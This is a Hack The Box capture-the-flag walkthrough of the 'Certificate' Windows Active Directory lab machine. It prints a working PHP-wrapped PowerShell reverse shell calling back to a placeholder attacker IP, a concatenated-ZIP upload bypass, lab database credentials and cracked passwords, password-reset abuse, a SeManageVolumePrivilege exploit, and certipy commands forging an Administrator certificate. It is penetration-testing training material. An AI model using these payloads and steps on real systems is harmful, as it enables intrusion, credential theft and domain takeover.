---
icon: file-certificate
---

# HTB-CERTIFICATE

This writeup details the process of exploiting the "Certificate" machine from Hack The Box (HTB), a Windows-based Active Directory (AD) environment rated as Hard difficulty with 40 points and a release date of 31 May 2025. The objective is to gain root access by exploiting vulnerabilities in a web application, achieving remote code execution, escalating privileges within the AD environment, and forging certificates to obtain Administrator access. This document is formatted for Notion and provides a detailed, step-by-step guide.

<figure><img src="../../../../.gitbook/assets/image (495).png" alt=""><figcaption></figcaption></figure>

### Attack Flow Explanation

* **Initial Access**: Registered on `certificate.htb`, identified `upload.php?s_id=36`, and uploaded a malicious ZIP to gain a reverse shell as `xamppuser`.
* **Database Exploitation**: Extracted database credentials from `db.php`, queried the `users` table, and cracked `Sara.B`’s password (`Blink182`).
* **AD Enumeration**: Used BloodHound to identify `Sara.B`’s membership in Account Operators, granting control over `Lion.SK`.
* **User Flag**: Reset `Lion.SK`’s password and accessed the user flag.
* **Privilege Escalation**: Reset `Ryan.K`’s password, exploited `SeManageVolumePrivilege` to gain full control over `C:`, and exported the CA certificate.
* **Root Access**: Forged an Administrator certificate using `certipy` and authenticated to obtain domain admin access and the root flag.

## Initial Enumeration

```sh
(sn0x㉿sn0x)-[~/hackthebox/Certificate]
└─$ rustscan -a 10.10.11.71 --ulimit 5000 --range 1-1000 -- -sCV -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
Discovered open port 80/tcp on 10.10.11.71
Discovered open port 445/tcp on 10.10.11.71
Discovered open port 53/tcp on 10.10.11.71
Discovered open port 139/tcp on 10.10.11.71
Discovered open port 88/tcp on 10.10.11.71
Discovered open port 135/tcp on 10.10.11.71
Discovered open port 636/tcp on 10.10.11.71
Discovered open port 464/tcp on 10.10.11.71
Discovered open port 389/tcp on 10.10.11.71
Discovered open port 593/tcp on 10.10.11.71

PORT    STATE SERVICE       REASON          VERSION
53/tcp  open  domain        syn-ack ttl 127 Simple DNS Plus
80/tcp  open  http          syn-ack ttl 127 Apache httpd 2.4.58 (OpenSSL/3.1.3 PHP/8.0.30)
|_http-title: Did not follow redirect to http://certificate.htb/
|_http-server-header: Apache/2.4.58 (Win64) OpenSSL/3.1.3 PHP/8.0.30
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
88/tcp  open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2025-06-01 03:01:55Z)
135/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
|_ssl-date: 2025-06-01T03:02:52+00:00; +8h00m03s from scanner time.
445/tcp open  microsoft-ds? syn-ack ttl 127
464/tcp open  kpasswd5?     syn-ack ttl 127
593/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp open  ssl/ldap      syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: certificate.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-01T03:02:51+00:00; +8h00m03s from scanner time.
| ssl-cert: Subject: commonName=DC01.certificate.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.certificate.htb
| Issuer: commonName=Certificate-LTD-CA/domainComponent=certificate
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-11-04T03:14:54
| Not valid after:  2025-11-04T03:14:54
| MD5:   0252:f5f4:2869:d957:e8fa:5c19:dfc5:d8ba
| SHA-1: 779a:97b1:d8e4:92b5:bafe:bc02:3388:45ff:dff7:6ad2
| -----BEGIN CERTIFICATE-----
| MIIGTDCCBTSgAwIBAgITWAAAAALKcOpOQvIYpgAAAAAAAjANBgkqhkiG9w0BAQsF
| ADBPMRMwEQYKCZImiZPyLGQBGRYDaHRiMRswGQYKCZImiZPyLGQBGRYLY2VydGlm
| aWNhdGUxGzAZBgNVBAMTEkNlcnRpZmljYXRlLUxURC1DQTAeFw0yNDExMDQwMzE0
| NTRaFw0yNTExMDQwMzE0NTRaMB8xHTAbBgNVBAMTFERDMDEuY2VydGlmaWNhdGUu
| aHRiMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAokh23/3HZrU3FA6t
| JQFbvrM0+ee701Q0/0M4ZQ3r1THuGXvtHnqHFBjJSY/p0SQ0j/jeCAiSwlnG/Wf6
| 6px9rUwjG7gfzH6WqoAMOlpf+HMJ+ypwH59+tktARf17OrrnMHMYXwwILUZfJjH1
| 73VnWwxodz32ZKklgqeHLASWke63yp7QM31vnZBnolofe6gV3pf6ZEJ58sNY+X9A
| t+cFnBtJcQ7TbxhB7zJHICHHn2qFRxL7u6GPPMeC0KdL8zDskn34UZpK6gyV+bNM
| G78cW3QFP00i+ixHkPUxGZho8b708FfRbEKuxSzL4auGuAhsE+ElWna1fBiuhmCY
| DNnA7QIDAQABo4IDTzCCA0swLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBhAGkAbgBD
| AG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggrBgEFBQcD
| ATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG9w0DAgIC
| AIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQMEAS0wCwYJ
| YIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0DBzAdBgNV
| HQ4EFgQURw6wHadBRcMGfsqMbHNqwpNKRi4wHwYDVR0jBBgwFoAUOuH3UW3vrUoY
| d0Gju7uF5m6Uc6IwgdEGA1UdHwSByTCBxjCBw6CBwKCBvYaBumxkYXA6Ly8vQ049
| Q2VydGlmaWNhdGUtTFRELUNBLENOPURDMDEsQ049Q0RQLENOPVB1YmxpYyUyMEtl
| eSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9Y2Vy
| dGlmaWNhdGUsREM9aHRiP2NlcnRpZmljYXRlUmV2b2NhdGlvbkxpc3Q/YmFzZT9v
| YmplY3RDbGFzcz1jUkxEaXN0cmlidXRpb25Qb2ludDCByAYIKwYBBQUHAQEEgbsw
| gbgwgbUGCCsGAQUFBzAChoGobGRhcDovLy9DTj1DZXJ0aWZpY2F0ZS1MVEQtQ0Es
| Q049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENO
| PUNvbmZpZ3VyYXRpb24sREM9Y2VydGlmaWNhdGUsREM9aHRiP2NBQ2VydGlmaWNh
| dGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9yaXR5MEAGA1Ud
| EQQ5MDegHwYJKwYBBAGCNxkBoBIEEAdHN3ziVeJEnb0gcZhtQbWCFERDMDEuY2Vy
| dGlmaWNhdGUuaHRiME4GCSsGAQQBgjcZAgRBMD+gPQYKKwYBBAGCNxkCAaAvBC1T
| LTEtNS0yMS01MTU1Mzc2NjktNDIyMzY4NzE5Ni0zMjQ5NjkwNTgzLTEwMDAwDQYJ
| KoZIhvcNAQELBQADggEBAIEvfy33XN4pVXmVNJW7yOdOTdnpbum084aK28U/AewI
| UUN3ZXQsW0ZnGDJc0R1b1HPcxKdOQ/WLS/FfTdu2YKmDx6QAEjmflpoifXvNIlMz
| qVMbT3PvidWtrTcmZkI9zLhbsneGFAAHkfeGeVpgDl4OylhEPC1Du2LXj1mZ6CPO
| UsAhYCGB6L/GNOqpV3ltRu9XOeMMZd9daXHDQatNud9gGiThPOUxFnA2zAIem/9/
| UJTMmj8IP/oyAEwuuiT18WbLjEZG+ALBoJwBjcXY6x2eKFCUvmdqVj1LvH9X+H3q
| S6T5Az4LLg9d2oa4YTDC7RqiubjJbZyF2C3jLIWQmA8=
|_-----END CERTIFICATE-----
Service Info: Hosts: certificate.htb, DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 50770/tcp): CLEAN (Timeout)
|   Check 2 (port 45128/tcp): CLEAN (Timeout)
|   Check 3 (port 43669/udp): CLEAN (Timeout)
|   Check 4 (port 62828/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-01T03:02:12
|_  start_date: N/A
|_clock-skew: mean: 8h00m03s, deviation: 0s, median: 8h00m02s

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 00:32
Completed NSE at 00:32, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 00:32
Completed NSE at 00:32, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 00:32
Completed NSE at 00:32, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 64.12 seconds
           Raw packets sent: 10 (440B) | Rcvd: 10 (440B)

```

Upon navigating to `certificate.htb`, we discover an e-learning platform offering educational courses across different topics. The site contains a blog section as well, though certain features—most notably the search function—are currently broken or disabled.

<figure><img src="../../../../.gitbook/assets/image (496).png" alt=""><figcaption></figcaption></figure>

The registration functionality is active, offering student and teacher account types. Given that teacher accounts require manual approval, I proceed with student account creation.

Post-authentication, I select an arbitrary course and observe two available actions: feedback submission and course enrollment. Enrolling in a course provides access to the course outline, which features an assignment upload mechanism.

<figure><img src="../../../../.gitbook/assets/image (497).png" alt=""><figcaption></figcaption></figure>

#### Objective

Identify services and vulnerabilities on the target to gain initial access.

1. **Setting Up Hosts File**
   * Added the target domain and domain controller to the local `/etc/hosts` file to resolve DNS names correctly.
   *   Command:

       ```bash
       echo '10.10.11.71 certificate.htb DC01.certificate.htb' | sudo tee -a /etc/hosts

       ```
2. **Web Application Discovery**
   * Navigated to `http://certificate.htb` and found a web application with registration and login functionality.
   *   Performed directory enumeration using `gobuster` to identify accessible endpoints:

       ```bash
       gobuster dir -u "<http://certificate.htb>" -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 100 -x php

       ```
   * Results:
     * `/static` (Status: 301)
     * `/footer.php` (Status: 200, Size: 2955)
     * `/upload.php` (Status: 302, redirects to `login.php`)
     * `/courses.php` (Status: 302, redirects to `login.php`)
     * `/About.php` (Status: 200, Size: 14826)
3. **Exploring upload.php**
   *   Attempted to access `http://certificate.htb/upload.php` directly, which returned:

       ```
       404 Not Found
       No quizz found with the given SID.

       ```
   * Hypothesized that `upload.php` requires a valid `s_id` parameter (e.g., `upload.php?s_id=<value>`).
   *   Used Burp Suite Intruder (or alternatively `wfuzz`) to fuzz the `s_id` parameter:

       ```bash
       wfuzz -c -z range,1-100 -u "<http://certificate.htb/upload.php?s_id=FUZZ>"

       ```
   *   Identified a valid `s_id=36`, which loaded a file upload interface at:

       ```
       <http://certificate.htb/upload.php?s_id=36>

       ```

***

## Exploitation: Reverse Shell via Malicious ZIP

#### Objective

Achieve remote code execution (RCE) by exploiting the file upload functionality to gain a reverse shell as `xamppuser`.

1. **Crafting a Malicious ZIP File**
   * The upload functionality likely processes ZIP files containing PDFs. To bypass potential file validation, created a ZIP file combining a benign PDF and a malicious PHP file.
   * Steps:
     *   Created a legitimate PDF:

         ```bash
         echo "I love sn0x" > legit.pdf
         zip benign.zip legit.pdf

         ```
     *   Created a malicious PHP file (`shell.php`) to establish a PowerShell reverse shell:

         ```php
         <?php
         shell_exec("powershell -nop -w hidden -c \\"\\$client = New-Object System.Net.Sockets.TCPClient('YOURIP', 44444); \\$stream = \\$client.GetStream(); [byte[]]\\$bytes = 0..65535|%{0}; while((\\$i = \\$stream.Read(\\$bytes, 0, \\$bytes.Length)) -ne 0){; \\$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\\$bytes, 0, \\$i); \\$sendback = (iex \\$data 2>&1 | Out-String); \\$sendback2 = \\$sendback + 'PS ' + (pwd).Path + '> '; \\$sendbyte = ([text.encoding]::ASCII).GetBytes(\\$sendback2); \\$stream.Write(\\$sendbyte, 0, \\$sendbyte.Length); \\$stream.Flush()}; \\$client.Close()\\"");
         ?>

         ```
     *   Organized the malicious file in a directory:

         ```bash
         mkdir malicious_files
         mv shell.php malicious_files/

         ```
     *   Created a malicious ZIP:

         ```bash
         zip -r malicious.zip malicious_files/

         ```
     *   Combined the benign and malicious ZIPs to bypass validation:

         ```bash
         cat benign.zip malicious.zip > combined.zip

         ```
2. **Uploading the ZIP**
   * Navigated to `http://certificate.htb/upload.php?s_id=36` and uploaded `combined.zip`.
   *   The server processed the ZIP and generated a link to the uploaded PDF:

       ```
       <http://certificate.htb/static/uploads/6fd6ce565d8e0c484086e1debee16872/legit.pdf>

       ```
3. **Triggering the Reverse Shell**
   *   Modified the URL to access the malicious PHP file:

       ```
       <http://certificate.htb/static/uploads/6fd6ce565d8e0c484086e1debee16872/malicious_files/shell.php>

       ```
   *   Set up a Netcat listener on the attacker's machine:

       ```bash
       nc -nlvp 4444

       ```
   *   Accessed the malicious URL, triggering the PHP script and receiving a reverse shell:

       ```
       listening on [any] 4444 ...
       connect to [YOURIP] from (UNKNOWN) [10.10.11.71] 65104
       PS C:\\xampp\\htdocs\\certificate\\html\\static\\uploads\\6fd6ce565d8e0c484086e1debee16872\\malicious_files>
       whoami
       certificate\\xamppuser

       ```

***

## Post-Exploitation: Database Credential Extraction

#### Objective

Extract database credentials to obtain user hashes and escalate privileges.

1. **Locating Database Configuration**
   *   Navigated the file system in the reverse shell to find the web application’s configuration files:

       ```powershell
       cd C:\\xampp\\htdocs\\certificate.htb
       dir

       ```
   *   Identified and read `db.php`:

       ```powershell
       type db.php

       ```
   *   Contents:

       ```php
       <?php
       // Database connection using PDO
       try {
           $dsn = 'mysql:host=localhost;dbname=Certificate_WEBAPP_DB;charset=utf8mb4';
           $db_user = 'certificate_webapp_user';
           $db_passwd = 'certificateDBPWD';
           $options = [
               PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION,
               PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC,
           ];
           $pdo = new PDO($dsn, $db_user, $db_passwd, $options);
       } catch (PDOException $e) {
           die('Database connection failed: ' . $e->getMessage());
       }
       ?>

       ```
   * Extracted credentials:
     * Username: `certificate_webapp_user`
     * Password: `certificateDBPWD`
     * Database: `Certificate_WEBAPP_DB`
2. **Querying the Database**
   *   Used the MySQL client on the target to query the `users` table:

       ```powershell
       C:\\xampp\\mysql\\bin\\mysql.exe -u certificate_webapp_user -p"certificateDBPWD" -D Certificate_WEBAPP_DB -e "SELECT * FROM users;"

       ```
   *   Obtained user credentials, focusing on `Sara.B`’s hash:

       ```
       $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFoGuUs3nB.pzQPV.g8UdXiXzNdH6

       ```
3. **Cracking the Password**
   *   Saved `Sara.B`’s hash to `hash.txt` on the attacker’s machine:

       ```bash
       echo '$2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFoGuUs3nB.pzQPV.g8UdXiXzNdH6' > hash.txt

       ```
   *   Cracked the hash using `hashcat` with the `rockyou.txt` wordlist:

       ```bash
       hashcat -a 0 -m 3200 hash.txt /usr/share/wordlists/rockyou.txt

       ```
   *   Result:

       ```
       $2y$04$CgDe/Thzw/Em/M4SkmXNbu0YdFoGuUs3nB.pzQPV.g8UdXiXzNdH6:Blink182

       ```

       * Credential: `Sara.B` / `Blink182`

***

## Privilege Escalation: Active Directory Enumeration

#### Objective

Use `Sara.B`’s credentials to enumerate AD privileges and escalate to a domain user.

1.  **Running BloodHound**

    *   Collected AD data using `bloodhound-python`:

        ```bash
        bloodhound-python -u 'Sara.B' -p 'Blink182' -d certificate.htb -c All --zip -ns 10.10.11.71

        ```
    * Imported the ZIP file into BloodHound and analyzed the graph.
    * Searched for `SARA.B@CERTIFICATE.HTB` and explored its privileges:



<figure><img src="../../../../.gitbook/assets/image (498).png" alt=""><figcaption></figcaption></figure>

* Found `Sara.B` is a member of the **Account Operators** group.
* Account Operators have **GenericAll** privileges over `LION.SK@CERTIFICATE.HTB`, indicating full control.

1. **Abusing Account Operators Privileges**
   *   Used `net rpc` to reset the password for `Lion.SK`:

       ```bash
       net rpc password "lion.sk" "newP@ssword2022" -U "certificate.htb/Sara.B%Blink182" -S certificate.htb

       ```
   *   Logged in via `evil-winrm` using the new credentials:

       ```bash
       evil-winrm -i 10.10.11.71 -u 'Lion.SK' -p 'newP@ssword2022'

       ```
   *   Accessed the user flag:

       ```powershell
       type C:\\Users\\Lion.SK\\Desktop\\user.txt

       ```

***

## Root Privilege Escalation: Exploiting SeManageVolumePrivilege

Navigating to the `Documents` folder under the `sara.b` account reveals a `WS-01` subdirectory containing two files. The `description.txt` file offers contextual information about the network traffic captured in `WS-01_PktMon.pcap`.

```
C:\Users\Sara.B\Documents\WS-01\Description.txt
```

The target workstation (WS-01) exhibits anomalous behavior when attempting to access the "Reports" SMB share located on DC01. Invalid authentication attempts correctly trigger credential errors, while valid authentication results in File Explorer hanging before terminating unexpectedly.

Examining the packet capture reveals predominantly SMB traffic attributed to the `Administrator` account, accompanied by Kerberos protocol exchanges involving the `lion.sk` user account.

The packet capture contains mostly connections from `Administrator` via `SMB` but also **Kerberos** activity from account `lion.sk`.

<figure><img src="../../../../.gitbook/assets/image (499).png" alt=""><figcaption></figcaption></figure>

#### Objective

Escalate from `Lion.SK` to `Ryan.K` and exploit `SeManageVolumePrivilege` to gain full control over the system.

1. **Resetting Ryan.K’s Password**
   *   As `Sara.B` (via Account Operators), reset `Ryan.K`’s password:

       ```bash
       net rpc password "Ryan.K" "newP@ssword2022" -U "certificate.htb/Sara.B%Blink182" -S certificate.htb

       ```
   *   Logged in via `evil-winrm`:

       ```bash
       evil-winrm -i 10.10.11.71 -u 'Ryan.K' -p 'newP@ssword2022'

       ```
2. **Checking Privileges**
   *   Ran `whoami /priv` to enumerate privileges:

       ```powershell
       whoami /priv

       ```
   *   Output:

       ```
       Privilege Name                   Description                          State
       SeMachineAccountPrivilege        Add workstations to domain           Enabled
       SeChangeNotifyPrivilege          Bypass traverse checking             Enabled
       SeManageVolumePrivilege          Perform volume maintenance tasks     Enabled
       SeIncreaseWorkingSetPrivilege    Increase a process working set       Enabled

       ```
   * Identified `SeManageVolumePrivilege`, which can be exploited to gain elevated privileges.
3. **Exploiting SeManageVolumePrivilege**
   *   Downloaded `SeManageVolumeExploit.exe` from:

       ```
       <https://github.com/CsEnox/SeManageVolumeExploit/releases/tag/public>

       ```
   *   Uploaded the exploit to the target:

       ```powershell
       upload SeManageVolumeExploit.exe

       ```
   *   Executed the exploit:

       ```powershell
       .\\SeManageVolumeExploit.exe

       ```
   *   Output:

       ```
       Entries changed: 837
       DONE

       ```
   * The exploit granted `Ryan.K` full control over the `C:` drive.

***

## Final Escalation: Forging Administrator Certificate

I leverage my newly obtained access to perform ADCS reconnaissance using certipy-ad. The results reveal:

* **Vulnerability**: ESC3
* **Template**: Delegated-CRA
* **Enrollment capability**: Enabled via `Domain CRA Managers` group membership

#### Objective

Forge an Administrator certificate using the domain’s Certificate Authority (CA) to gain domain admin access.

1. **Exporting the CA Certificate**
   *   As `Ryan.K`, exported the CA certificate to a PFX file:

       ```powershell
       certutil -exportPFX -my "Certificate-LTD-CA" C:\\Users\\Public\\ca.pfx

       ```
   *   Downloaded the PFX file:

       ```powershell
       cd C:\\Users\\Public
       download ca.pfx

       ```
2. **Forging an Administrator Certificate**
   *   Used `certipy` to forge an Administrator certificate:

       ```bash
       certipy forge -ca-pfx ca.pfx -upn 'administrator@certificate.htb' -subject 'CN=Administrator,CN=Users,DC=certificate,DC=htb' -out forged_admin.pfx

       ```
   *   Output:

       ```
       [*] Saving forged certificate and private key to 'forged_admin.pfx'
       [*] Wrote forged certificate and private key to 'forged_admin.pfx'

       ```
3. **Authenticating as Administrator**
   *   Used the forged certificate to authenticate and retrieve the Administrator’s NTLM hash:

       ```bash
       certipy auth -pfx forged_admin.pfx -dc-ip 10.10.11.71 -username 'administrator' -domain 'certificate.htb'

       ```
   * Obtained the Administrator hash, enabling full domain access.
   *   Alternatively, used the hash to log in via `evil-winrm` or `psexec` to access the root flag:

       ```powershell
       type C:\\Users\\Administrator\\Desktop\\root.txt
       ```

***

OR U CAN DO&#x20;

<pre class="language-shell"><code class="lang-shell">(sn0x㉿sn0x)-[~/hackthebox/Certificate]
└─$ certipy-ad find -u lion.sk@certificate.htb \
                  -p '!QAZ2wsx' \
                  -vulnerable \
                  -stdout
Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
[*] Finding certificate templates
[*] Found 35 certificate templates
[*] Finding certificate authorities
[*] Found 1 certificate authority
[*] Found 12 enabled certificate templates
[*] Finding issuance policies
[*] Found 18 issuance policies
[*] Found 0 OIDs linked to templates
[*] Retrieving CA configuration for 'Certificate-LTD-CA' via RRP
[*] Successfully retrieved CA configuration for 'Certificate-LTD-CA'
[*] Checking web enrollment for CA 'Certificate-LTD-CA' @ 'DC01.certificate.htb'
[!] Error checking web enrollment: timed out
[!] Use -debug to print a stacktrace
[*] Enumeration output:
Certificate Authorities
  0
    CA Name                             : Certificate-LTD-CA
    DNS Name                            : DC01.certificate.htb
    Certificate Subject                 : CN=Certificate-LTD-CA, DC=certificate, DC=htb
    Certificate Serial Number           : 75B2F4BBF31F108945147B466131BDCA
    Certificate Validity Start          : 2024-11-03 22:55:09+00:00
    Certificate Validity End            : 2034-11-03 23:05:09+00:00
    Web Enrollment
      HTTP
        Enabled                         : False
      HTTPS
        Enabled                         : False
    User Specified SAN                  : Disabled
    Request Disposition                 : Issue
    Enforce Encryption for Requests     : Enabled
    Active Policy                       : CertificateAuthority_MicrosoftDefault.Policy
    Permissions
      Owner                             : CERTIFICATE.HTB\Administrators
      Access Rights
        ManageCa                        : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        ManageCertificates              : CERTIFICATE.HTB\Administrators
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Enroll                          : CERTIFICATE.HTB\Authenticated Users
Certificate Templates
  0
<strong>    Template Name                       : Delegated-CRA
</strong>    Display Name                        : Delegated-CRA
    Certificate Authorities             : Certificate-LTD-CA
    Enabled                             : True
    Client Authentication               : False
    Enrollment Agent                    : True
    Any Purpose                         : False
    Enrollee Supplies Subject           : False
    Certificate Name Flag               : SubjectAltRequireUpn
                                          SubjectAltRequireEmail
                                          SubjectRequireEmail
                                          SubjectRequireDirectoryPath
    Enrollment Flag                     : IncludeSymmetricAlgorithms
                                          PublishToDs
                                          AutoEnrollment
    Private Key Flag                    : ExportableKey
    Extended Key Usage                  : Certificate Request Agent
    Requires Manager Approval           : False
    Requires Key Archival               : False
    Authorized Signatures Required      : 0
    Schema Version                      : 2
    Validity Period                     : 1 year
    Renewal Period                      : 6 weeks
    Minimum RSA Key Length              : 2048
    Template Created                    : 2024-11-05T19:52:09+00:00
    Template Last Modified              : 2024-11-05T19:52:10+00:00
    Permissions
      Enrollment Permissions
        Enrollment Rights               : CERTIFICATE.HTB\Domain CRA Managers
                                          CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
      Object Control Permissions
        Owner                           : CERTIFICATE.HTB\Administrator
        Full Control Principals         : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Owner Principals          : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Dacl Principals           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
        Write Property Enroll           : CERTIFICATE.HTB\Domain Admins
                                          CERTIFICATE.HTB\Enterprise Admins
    [+] User Enrollable Principals      : CERTIFICATE.HTB\Domain CRA Managers
    [!] Vulnerabilities
<strong>      ESC3                              : Template has Certificate Request Agent EKU set.
</strong></code></pre>

The Certificate Request Agent extended key usage (EKU) represents a powerful privilege within Active Directory Certificate Services, allowing holders to request certificates on behalf of other domain users. The exploitation process follows a two-phase approach: first, an enrollment agent certificate must be acquired with the Certificate Request Agent EKU; second, this certificate is presented as proof of authorization when requesting certificates for target accounts.

